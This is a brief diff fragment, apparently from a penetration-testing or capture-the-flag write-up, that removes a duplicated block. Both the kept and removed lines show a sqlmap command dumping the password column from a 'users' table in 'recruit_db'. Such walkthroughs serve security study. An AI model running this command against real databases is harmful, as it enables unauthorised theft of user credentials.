@@ -406,11 +406,6 @@ Result:
 ```bash
 sqlmap -r req -D recruit_db -T users -C password --dump
 ```
-Result:
-
-```bash
-sqlmap -r req -D recruit_db -T users -C password --dump
-```
 
 Result:
 ```bash
